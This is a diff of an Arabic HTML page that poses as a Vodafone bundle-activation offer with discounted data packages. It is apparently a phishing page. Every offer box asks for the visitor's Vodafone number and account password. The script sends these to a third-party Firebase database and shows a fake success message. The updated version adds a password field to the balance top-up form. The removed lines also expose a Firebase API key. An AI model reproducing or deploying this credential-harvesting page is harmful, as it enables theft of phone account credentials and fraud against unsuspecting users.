@@ -1,193 +1,214 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>تفعيل باقات فودافون</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- Firebase -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  <style>
-    body {
-      background-color: #7b0000;
-      color: white;
-      font-family: 'Cairo', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-      overflow-x: hidden;
-    }
+  <meta charset="UTF-8" />
+  <title>تفعيل باقات فودافون</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-    .container {
-      padding: 20px;
-      position: relative;
-      z-index: 1;
-    }
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
 
-    h1 {
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(to bottom, #8e0000, #330000);
+      color: white;
+      text-align: center;
+    }
 
-    .subtitle {
-      font-size: 16px;
-      margin-bottom: 30px;
-    }
+    .container {
+      padding: 30px 15px;
+    }
 
-    .box {
-      background-color: rgba(255, 255, 255, 0.05);
-      border: 1px solid #ff4d4d;
-      border-radius: 10px;
-      padding: 20px;
-      margin: 10px;
-    }
+    h1 {
+      font-size: 30px;
+      margin-bottom: 5px;
+      animation: fadeIn 1s ease-out;
+    }
 
-    .btn {
-      display: inline-block;
-      padding: 10px 20px;
-      background: white;
-      color: #7b0000;
-      border-radius: 25px;
-      text-decoration: none;
-      font-weight: bold;
-      margin-top: 10px;
-      cursor: pointer;
-    }
+    .subtitle {
+      font-size: 16px;
+      margin-bottom: 30px;
+      color: #ffdede;
+      animation: fadeIn 1.5s ease-out;
+    }
 
-    input {
-      display: block;
-      width: 80%;
-      margin: 10px auto;
-      padding: 10px;
-      border-radius: 8px;
-      border: none;
-    }
+    .box {
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid #ff3333;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+      transition: transform 0.3s;
+    }
 
-    .conditions {
-      font-size: 12px;
-      margin-top: 10px;
-      color: #ffcccc;
-    }
+    .box:hover {
+      transform: scale(1.03);
+    }
 
-    footer {
-      margin-top: 40px;
-      font-size: 14px;
-      opacity: 0.6;
-      direction: ltr;
-    }
+    h2 {
+      margin-top: 0;
+      font-size: 22px;
+      color: #ffcccc;
+    }
 
-    #successPopup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: white;
-      color: #7b0000;
-      padding: 30px;
-      border-radius: 15px;
-      font-size: 18px;
-      font-weight: bold;
-      display: none;
-      z-index: 999;
-    }
-  </style>
+    input {
+      display: block;
+      width: 90%;
+      margin: 10px auto;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 14px;
+    }
+
+    .btn {
+      background-color: white;
+      color: #8e0000;
+      padding: 10px 20px;
+      border-radius: 25px;
+      cursor: pointer;
+      font-weight: bold;
+      display: inline-block;
+      transition: background-color 0.3s;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background-color: #ffe6e6;
+    }
+
+    .conditions {
+      font-size: 12px;
+      color: #ffcccc;
+      margin-top: 10px;
+    }
+
+    #successPopup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      background: white;
+      color: #7b0000;
+      padding: 25px;
+      border-radius: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      z-index: 999;
+      animation: popupIn 0.5s forwards;
+      display: none;
+    }
+
+    @keyframes popupIn {
+      to {
+        transform: translate(-50%, -50%) scale(1);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 14px;
+      opacity: 0.7;
+      direction: ltr;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>تفعيل باقات فودافون</h1>
-    <p class="subtitle">أقوى العروض بسرعة الصاروخ</p>
+  <div class="container">
+    <h1>تفعيل باقات فودافون</h1>
+    <p class="subtitle">أقوى العروض بأقل الأسعار</p>
 
-    <!-- فليكس 13000 -->
-    <div class="box">
-      <h2>13000 فليكس</h2>
-      <p>240 جنيه</p>
-      <div class="conditions">شروط: لا يكون عليك سلف أو نوتة - التفعيل خلال ساعتين من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="num1">
-      <input type="password" placeholder="كلمة المرور" id="pass1">
-      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
-    </div>
+    <!-- باقة فليكس 13000 -->
+    <div class="box">
+      <h2>فليكس 13000 - 240 جنيه</h2>
+      <div class="conditions">شروط: لا يوجد سلف أو نوتة - التفعيل خلال ساعتين</div>
+      <input type="text" placeholder="رقم فودافون" id="num1" />
+      <input type="password" placeholder="كلمة المرور" id="pass1" />
+      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
+    </div>
 
-    <!-- 40 جيجا -->
-    <div class="box">
-      <h2>40 جيجا</h2>
-      <p>330 جنيه</p>
-      <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="num2">
-      <input type="password" placeholder="كلمة المرور" id="pass2">
-      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
-    </div>
+    <!-- باقة 40 جيجا -->
+    <div class="box">
+      <h2>40 جيجا - 330 جنيه</h2>
+      <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة</div>
+      <input type="text" placeholder="رقم فودافون" id="num2" />
+      <input type="password" placeholder="كلمة المرور" id="pass2" />
+      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
+    </div>
 
-    <!-- رصيد صافي -->
-    <div class="box">
-      <h2>شحن رصيد صافي</h2>
-      <p>اكتب الكمية واحسب</p>
-      <div class="conditions">يتم إرسال الرصيد خلال نصف ساعة من إدخال الرقم</div>
-      <input type="text" placeholder="رقم فودافون" id="num3">
-      <input type="number" placeholder="كمية الصافي" id="eg3">
-      <p id="costDisplay"></p>
-      <div class="btn" onclick="sendData('رصيد صافي', 'num3', '', 'eg3')">شحن الآن</div>
-    </div>
+    <!-- شحن رصيد صافي -->
+    <div class="box">
+      <h2>شحن رصيد صافي - حسب الطلب</h2>
+      <div class="conditions">شروط: لا يوجد سلف - التفعيل خلال ساعة</div>
+      <input type="text" placeholder="رقم فودافون" id="num3" />
+      <input type="password" placeholder="كلمة المرور" id="pass3" />
+      <div class="btn" onclick="sendData('شحن رصيد صافي', 'num3', 'pass3')">شحن الآن</div>
+    </div>
 
-    <footer>Developed by: mahmoud gamal</footer>
-  </div>
+    <div id="successPopup">تم الإرسال بنجاح!</div>
 
-  <div id="successPopup">تم إرسال الطلب بنجاح</div>
+    <footer>
+      جميع الحقوق محفوظة &copy; mahmoud gamal
+    </footer>
+  </div>
 
-  <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
-      authDomain: "starkoscript.firebaseapp.com",
-      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
-      projectId: "starkoscript",
-      storageBucket: "starkoscript.appspot.com",
-      messagingSenderId: "381525854892",
-      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+  <script>
+    const firebaseConfig = {
+      databaseURL: "https://vodafonedb-default-rtdb.firebaseio.com/"
+    };
 
-    // حساب التكلفة
-    const costDisplay = document.getElementById("costDisplay");
-    const egInput = document.getElementById("eg3");
-    if (egInput) {
-      egInput.addEventListener("input", () => {
-        const val = parseFloat(egInput.value);
-        if (!isNaN(val)) {
-          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
-        } else {
-          costDisplay.textContent = "";
-        }
-      });
-    }
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    // إرسال البيانات
-    function sendData(type, numId, passId = '', egId = '') {
-      const num = document.getElementById(numId).value;
-      const pass = passId ? document.getElementById(passId).value : "";
-      const eg = egId ? document.getElementById(egId).value : "";
+    function sendData(packageName, numId, passId) {
+      const num = document.getElementById(numId).value.trim();
+      const pass = document.getElementById(passId).value.trim();
 
-      db.ref("vodafonedb").push({
-        type,
-        num,
-        pass,
-        eg
-      }).then(() => {
-        showPopup();
-      }).catch((err) => {
-        alert("حدث خطأ أثناء الإرسال");
-        console.error(err);
-      });
-    }
+      if (num && pass) {
+        db.ref("vodafonedb").push({
+          num: num,
+          pass: pass,
+          pack: packageName
+        })
+        .then(() => {
+          showSuccessPopup();
+          document.getElementById(numId).value = "";
+          document.getElementById(passId).value = "";
+        })
+        .catch((error) => {
+          alert("حدث خطأ: " + error.message);
+        });
+      } else {
+        alert("يرجى إدخال الرقم وكلمة المرور.");
+      }
+    }
 
-    // عرض رسالة النجاح
-    function showPopup() {
-      const popup = document.getElementById("successPopup");
-      popup.style.display = "block";
-      setTimeout(() => {
-        popup.style.display = "none";
-      }, 3000);
-    }
-  </script>
+    function showSuccessPopup() {
+      const popup = document.getElementById("successPopup");
+      popup.style.display = "block";
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 2000);
+    }
+  </script>
 </body>
 </html>
